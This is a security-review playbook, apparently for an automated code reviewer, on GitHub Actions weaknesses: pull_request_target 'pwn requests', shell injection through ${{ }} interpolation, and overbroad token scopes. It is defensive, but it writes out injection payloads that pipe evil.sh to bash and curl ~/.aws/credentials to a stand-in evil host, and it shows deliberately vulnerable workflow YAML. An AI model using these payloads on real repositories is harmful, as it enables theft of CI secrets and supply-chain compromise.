---
id: technology.github_actions.cicd_security
title: GitHub Actions CI/CD Security
category: technology
vulnerabilityClass: ci_cd_pipeline_compromise
appliesToStack: github-actions
deepOnly: false
reviewPass: 1
owaspRefs:
  - "A08:2021 Software and Data Integrity Failures"
cweRefs:
  - "CWE-94"
  - "CWE-78"
  - "CWE-269"
realWorldReferences:
  - title: "Keeping your GitHub Actions workflows secure Part 1: Preventing pwn requests"
    url: "https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/"
    type: security_blog
  - title: "Keeping your GitHub Actions and workflows secure Part 2: Untrusted input"
    url: "https://securitylab.github.com/resources/github-actions-untrusted-input/"
    type: security_blog
  - title: "openlit — Remote Code Execution / Secret Exposure via Misuse of pull_request_target (GHSA-9jgv-x8cq-296q)"
    url: "https://github.com/openlit/openlit/security/advisories/GHSA-9jgv-x8cq-296q"
    type: vendor_security_advisory
  - title: "Securely using pull_request_target - GitHub Docs"
    url: "https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target"
    type: vendor_security_advisory
  - title: "Security hardening for GitHub Actions - GitHub Docs"
    url: "https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions"
    type: vendor_security_advisory
quickModeSummary: >
  Check every workflow trigger: does any job use `pull_request_target` while
  also checking out the PR's own head ref (`github.event.pull_request.head.sha`
  or similar) and then building/testing/running that code? That combination
  runs attacker-controlled code with base-repo secrets and a write-scoped
  token — a "pwn request." Separately, check every `run:` step for
  unsanitized interpolation of untrusted context values (issue/PR title,
  body, branch name, commit message, author) via `${{ ... }}` — this is
  literal shell script injection, not templating. Finally check
  `permissions:` blocks (workflow-level and job-level) for default or
  unscoped `write-all`/no-declaration on `GITHUB_TOKEN`, and whether
  repository/org secrets are exposed to jobs that don't need them.
fileSelectionHint:
  roles: ["ci_config", "workflow", "build_pipeline"]
  matchImports: []
  matchAuthMapTags: ["github_actions"]
  maxFiles: 8
  priorityOrder: ["ci_config", "workflow"]
severityHeuristics:
  critical:
    - "Workflow triggers on `pull_request_target` (or `workflow_run` from a fork-triggered workflow) AND checks out `github.event.pull_request.head.sha`/head ref AND executes that checked-out code (build script, test runner, `npm install` with lifecycle scripts, etc.) — full RCE with base-repo secrets and a write-scoped GITHUB_TOKEN."
    - "A `run:` step interpolates an untrusted context value (`github.event.issue.title`, `.pull_request.title`, `.head_commit.message`, `.pull_request.body`, `head_ref`, author `.name`/`.email`) directly into a shell command via `${{ }}`, with no intermediate environment variable — direct shell/command injection reachable by any external contributor."
  high:
    - "Workflow-level `permissions:` is absent (defaults vary by org settings but can grant broad read/write) or explicitly set to `write-all` when the workflow only needs read access or a single narrow write scope."
    - "A `pull_request_target` workflow does not check out untrusted code at all but still passes untrusted context values into a privileged step (e.g. posting a comment, labeling, or calling an internal API) without sanitization, enabling injection into downstream systems even without direct RCE."
  medium:
    - "Secrets are made available to a job (via `secrets: inherit` in a reusable workflow call, or job-level `env`) that doesn't need them for its actual steps, widening blast radius if any step in that job is later compromised."
    - "Untrusted input is interpolated into a `run:` step but passed as an environment variable first (`env: TITLE: ${{ github.event.issue.title }}`) — safer than direct interpolation but the script may still mishandle the env var unsafely (e.g. `eval $TITLE`)."
  low:
    - "Third-party actions pinned to a mutable tag (`@v3`) instead of a full commit SHA — supply-chain hardening gap, not itself an injection vulnerability, but worth noting alongside a critical/high finding in the same workflow."
graphNodeMapping:
  primaryNodeType: component
  primaryNodeId: "component:cicd_pipeline"
  relatedNodeIds: ["component:github_actions", "component:secrets_management", "component:supply_chain"]
graphEdgeMapping:
  - relation: depends_on
    from: "component:cicd_pipeline"
    to: "component:github_actions"
  - relation: protects
    from: "component:github_actions"
    to: "component:secrets_management"
  - relation: depends_on
    from: "component:github_actions"
    to: "component:supply_chain"
commonAiCodingMistakes:
  - "AI scaffolds a workflow that needs to comment on or label a PR from a fork, and reaches for `pull_request_target` (because `pull_request` from forks lacks write permission) without adding any guard against checking out or executing the PR's own code — the classic 'pwn request' shape gets introduced by well-intentioned automation, not malice."
  - "AI writes a debug/notification step like `run: echo \"New issue: ${{ github.event.issue.title }}\"` for logging or Slack-style messages, treating `${{ }}` as safe string templating rather than recognizing it performs literal, unescaped substitution into the shell command before the shell ever runs."
  - "AI copies a `permissions: write-all` or omits `permissions:` entirely from a workflow template because the example it generalized from didn't need to be least-privilege, then reuses that template across every new workflow in the repo."
  - "AI adds `secrets: inherit` when calling a reusable workflow to avoid wiring up individual secrets one by one, granting every downstream job access to the entire secret set instead of just what it needs."
falsePositiveGuardrails:
  - "`pull_request_target` alone is not the vulnerability — many workflows use it safely to label/triage PRs without ever checking out or executing the PR's code. Only flag it when combined with checkout of the PR head AND execution of that checked-out content (build, test, install with scripts, `actions/github-script` running the diff, etc.). Trace the actual checkout `ref:` and any run/build step that touches those files before concluding RCE."
  - "Interpolation of trusted, non-attacker-controlled context values (`github.repository`, `github.sha` on a `push` to a protected branch, `github.workflow`) into `run:` steps is not injectable — only flag interpolation of values an external, unprivileged contributor can set (issue/PR title, body, branch name, commit message, commenter-controlled labels, forked-repo file contents)."
  - "If the untrusted value is passed through an `env:` block before use in `run:` (rather than interpolated with `${{ }}` directly inside the script body), the shell-injection vector is closed — downgrade to checking whether the script itself then misuses that env var unsafely (e.g. `eval`, `bash -c \"$VAR\"`); do not flag it as direct injection."
  - "A missing `permissions:` block is not automatically a finding — GitHub's default token permissions depend on repository/org settings (`read-all` in newer defaults for many orgs). Note it as a hardening gap only if you can show the effective default in this repo's context is broader than needed, or if any job in the workflow performs a write action that would need explicit `contents: write`/`pull-requests: write`."
  - "Workflows triggered only by `push`/`pull_request` (not `pull_request_target`/`workflow_run`) from collaborators with write access are lower risk by design — GitHub gates `pull_request` from unknown forks out of secret access already. Confirm the trigger type before treating any interpolation finding in a plain `pull_request` workflow as attacker-reachable by an arbitrary external party."
---

## Root Cause Explanation

GitHub Actions security failures cluster around a single underlying confusion:
treating event-driven automation as if it always runs in a trusted context,
when several trigger types deliberately (and for good reason) hand elevated
privileges to code paths that untrusted external contributors can influence.

1. **The "pwn request" pattern (`pull_request_target` + untrusted
   checkout).** `pull_request` workflows run with a read-only token and no
   access to repository secrets when triggered by a fork — this is GitHub's
   safe default. `pull_request_target` exists as an escape hatch: it runs in
   the context of the **base** repository, with the base repo's
   `GITHUB_TOKEN` (often write-scoped) and full access to repository/org
   secrets — specifically so maintainers can safely triage untrusted PRs
   (label, comment) without merging them. The vulnerability appears when a
   workflow author then checks out the PR's own head commit (`ref:
   ${{ github.event.pull_request.head.sha }}` or `head_ref`) inside that
   privileged context and runs anything from it — install scripts, a test
   suite, a build step, a linter with plugin support. The result is
   attacker-authored code executing with maintainer-level credentials: full
   read of every secret the workflow can see, and often a write-scoped token
   that can push to branches or tags in the base repo. This is not a
   theoretical bug class — GitHub Security Lab's own research (Part 1 of
   their CI/CD hardening series is dedicated entirely to this pattern) and
   multiple disclosed advisories describe the exact same shape repeatedly.
2. **Script injection via unsanitized context interpolation.** GitHub Actions
   expression syntax `${{ github.event.X }}` is **not** a safe templating
   mechanism when used inside a `run:` block — it performs raw string
   substitution into the YAML *before* the shell ever executes, so the
   resulting shell command is built from attacker-controlled text. Several
   context fields are attacker-controlled by design and permit shell
   metacharacters: PR/issue titles and bodies, branch names (`head_ref`),
   commit messages, commit author name/email. A branch name like
   `zzz";curl evil.sh|bash;#` or a PR title containing backticks or `$()` is
   syntactically valid on GitHub and, if interpolated directly into a `run:`
   step, executes as shell code on the runner. This is functionally
   identical to classic SQL injection, just against a shell interpreter
   instead of a database — the fix is the same category of fix: never build
   executable syntax by string-concatenating untrusted input, pass it as
   data instead (an environment variable) so it's inert until (and unless)
   the script itself chooses to interpret it as code.
3. **Overly broad `GITHUB_TOKEN`/secrets scope.** The auto-generated
   `GITHUB_TOKEN` and any configured secrets are, by default in many
   workflow authoring patterns, available to every job in a workflow file
   even when only one job actually needs write access or secret access. When
   an AI or human author doesn't set an explicit `permissions:` block (or
   sets `write-all` for convenience), every step in every job — including
   steps whose only job is to run third-party actions or process untrusted
   input — inherits that broad scope. This turns an otherwise-contained
   script-injection or dependency-confusion bug into full write access to
   the repository or leaked org secrets, because the blast radius wasn't
   scoped down in the first place. `secrets: inherit` on reusable workflow
   calls has the same effect at the secrets layer.

These three issues compound: a `pull_request_target` workflow with broad
`permissions:` and a `run:` step that echoes the PR title is not three
separate low-severity issues, it's one critical RCE-with-secrets chain, and
should be reasoned about and reported as such.

## Vulnerable Patterns

Look for shapes like these (illustrative, not exhaustive — reason about
equivalents in the actual workflow YAML you're reviewing, don't string-match):

```yaml
# Pattern 1: "pwn request" — privileged trigger + untrusted checkout + execution
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # checks out attacker's code
      - run: npm install && npm test                        # ...then runs it, with base-repo secrets available

# Pattern 2: direct shell injection via unsanitized context interpolation
on:
  issues:
    types: [opened]
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Thanks for opening: ${{ github.event.issue.title }}"
        # if the title is: `"; curl http://evil/$(cat ~/.aws/credentials); #`
        # that command runs verbatim on the runner

# Pattern 3: overly broad token/secrets scope
on:
  pull_request_target:
permissions: write-all   # every step in every job gets broad write access
jobs:
  triage:
    steps:
      - uses: some/third-party-action@v1   # inherits write-all unnecessarily
```

The safe equivalents: use `pull_request` (not `_target`) unless elevated
access is genuinely required; never check out and execute untrusted head refs
inside a `pull_request_target` job; pass untrusted values through `env:` so
they're data, not code (`env: TITLE: ${{ github.event.issue.title }}` then
`run: echo "$TITLE"`); and set the narrowest `permissions:` block each job
actually needs (or `permissions: {}` plus explicit per-job grants).

## Data Flow Tracing Guide

To evaluate this playbook responsibly, trace the following before writing any
Finding:

1. For every workflow file, list its trigger(s) under `on:`. Flag any use of
   `pull_request_target` or `workflow_run` (when the triggering workflow runs
   on forked PRs) for closer inspection — these are the privileged-context
   triggers.
2. For each privileged-trigger workflow: does any `actions/checkout` step (or
   equivalent `git fetch`/`git checkout`) reference `github.event.pull_
   request.head.sha`, `head_ref`, or any other attacker-controlled ref? If
   so, trace forward — is that checked-out content subsequently built,
   installed (`npm install`, `pip install -e .`, etc.), tested, or otherwise
   executed in a later step of the same job? That chain is the critical
   finding; cite the checkout step's `ref:` line and the execution step's
   line together as one piece of evidence.
3. For every `run:` block in every workflow (regardless of trigger type),
   scan for `${{ github.event.* }}` or `${{ github.head_ref }}` interpolated
   directly inside the script body (not inside an `env:` block reference).
   Cross-check which of those event fields are attacker-controlled (issue/PR
   title & body, commit message, branch name, comment body, author name/
   email) versus system-controlled (`github.repository`, `github.sha` on
   protected-branch push, `github.run_id`). Only the former is a finding.
4. For each workflow, locate the `permissions:` block — check both
   workflow-level and any job-level overrides. Note whether it's absent,
   `write-all`, or scoped. Cross-reference with what each job's steps
   actually do (does any step call `actions/github-script` with write
   actions, push tags, create releases, publish packages?) to judge whether
   the granted scope exceeds actual need.
5. For reusable workflow calls (`uses: ./.github/workflows/x.yml` or a
   cross-repo reusable workflow), check whether `secrets: inherit` is used
   and whether the called workflow's jobs all genuinely need every inherited
   secret.

## Evidence Checklist

Before submitting a Finding for this playbook, confirm:

- [ ] For a "pwn request" finding: both the trigger line (`pull_request_
      target:`) and the checkout `ref:` line are cited, AND the specific
      downstream step that executes/builds/installs the checked-out code is
      cited by file + line.
- [ ] For a script-injection finding: the exact `run:` line containing the
      `${{ }}` interpolation is quoted verbatim, and the specific event field
      is identified as attacker-controlled (not assumed).
- [ ] For a permissions-scope finding: the exact `permissions:` declaration
      (or its absence, with the file confirmed to have no block) is cited,
      alongside the specific privileged action a step in that workflow
      performs that the scope enables.
- [ ] Confirmation that the trigger is genuinely reachable by an untrusted,
      unprivileged party (a fork PR, an issue from any GitHub user) — not a
      trigger restricted to `push` on a protected branch or manual
      `workflow_dispatch` by a maintainer.
- [ ] If claiming RCE severity: the full chain (trigger → checkout → execution,
      or trigger → interpolation → shell execution) is traced end-to-end with
      no unverified link.

A finding without at least one concrete YAML snippet with an exact file +
line range must not be submitted.

## Attack Scenario Template

> An external contributor opens a pull request (or issue/comment) containing
> [malicious payload — e.g. a crafted branch name, PR title, or a modified
> `package.json` install script]. Because the workflow at [file path] triggers
> on [`pull_request_target` / other privileged trigger] and [checks out the
> PR head at line N without restricting execution / interpolates the
> untrusted field directly into a `run:` step at line N], the payload
> executes as [shell code / a build script] with access to [specific secrets
> or token scope available to this workflow, named concretely — e.g. `NPM_
> PUBLISH_TOKEN`, a write-scoped `GITHUB_TOKEN`], resulting in [concrete
> impact specific to this repo — e.g. "exfiltration of the npm publish token,
> enabling a malicious package release" or "a forged commit pushed to the
> default branch" — not a generic description].

Fill every bracket concretely from evidence gathered in this repo. If a
bracket can't be filled from real evidence (e.g. no secret is actually
exposed to the vulnerable job), the scenario is speculative and severity must
be capped at `medium`, with a note that exploitability beyond code execution
on the runner is unconfirmed.

## Graph Mapping Instructions

- Always ensure a `component:github_actions` node exists (create it on the
  first CI/CD-related finding in a scan) with a `depends_on` edge from
  `component:cicd_pipeline`.
- Each concrete vulnerability becomes its own `finding:<uuid>` node of type
  `vulnerability`, with a `causes` edge from `component:github_actions` (or
  `component:secrets_management` if the root cause is scope/token
  over-permissioning) to the finding node.
- If a "pwn request" or script-injection finding results in exposure of a
  specific secret or the ability to push code, add an `enables` edge from the
  finding node to `component:secrets_management` and/or `component:supply_
  chain` as appropriate — this reflects that a CI/CD compromise is rarely the
  end goal, it's a pivot point.
- Root cause vs. symptom: if a permissions-scope finding (broad
  `GITHUB_TOKEN`/`secrets: inherit`) is what turns a script-injection finding
  from "runner compromise" into "secret exfiltration," say so explicitly in
  the finding's `reasoning` field so the graph mapper wires a `causes` edge
  between the two finding nodes rather than treating them as independent.
